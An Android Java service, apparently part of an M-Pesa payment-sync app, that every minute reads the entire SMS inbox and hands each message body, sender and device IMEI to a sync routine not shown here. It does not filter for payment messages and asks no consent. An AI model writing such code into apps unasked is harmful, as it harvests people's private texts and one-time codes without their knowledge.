package com.example.hacker_pc.sunami2mobile;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.telephony.TelephonyManager;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public final class mpesaService extends Service {
    private Handler handler;
    private Runnable r;
    private String imei;
    private Cursor cursor;

    public mpesaService() {
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        TelephonyManager tm = (TelephonyManager) mpesaService.this.getSystemService(Context.TELEPHONY_SERVICE);
        imei = tm.getDeviceId();
        readSms();
        return START_NOT_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    public void readSms() {
        // public static final String INBOX = "content://sms/inbox";
        // public static final String SENT = "content://sms/sent";
        // public static final String DRAFT = "content://sms/draft";
        handler = new Handler();
        handler.postDelayed(new Runnable() {
            public void run() {
                cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
                if (cursor.moveToFirst()) {
                    for (int idx = 0; idx < cursor.getCount(); idx++) {
                        String msg = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                        String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                        String person = cursor.getString(cursor.getColumnIndexOrThrow("person"));

                        JSONObject jo = new JSONObject();
                        JSONArray ja = new JSONArray();
                        try {
                            jo.put("imei", imei);
                            jo.put("msg", msg);
                            jo.put("address", address);
                            jo.put("person", person);
                            ja.put(jo);
                            mpesaSync.mpesaSync(ja);
                            cursor.moveToNext();
                        } catch (JSONException e) {

                        }
                    }
                    //Toast.makeText(mpesaService.this,String.valueOf(ja), Toast.LENGTH_LONG).show();
                    cursor.close();
                } else {
                    // empty box, no SMS
                }
                handler.postDelayed(this, 60000);
            }
        }, 2000);

        //multi threading
        /*Thread myThread = new Thread(new Runnable() {
            @Override
            public void run() {
               handler = new Handler(Looper.getMainLooper());
                handler.post(new Runnable() {
                    public void run() {
                        //action
                    }
                });
            }
        });
        myThread.start();*/
    }


    @Override
    public boolean stopService(Intent name) {
        return super.stopService(name);
    }
}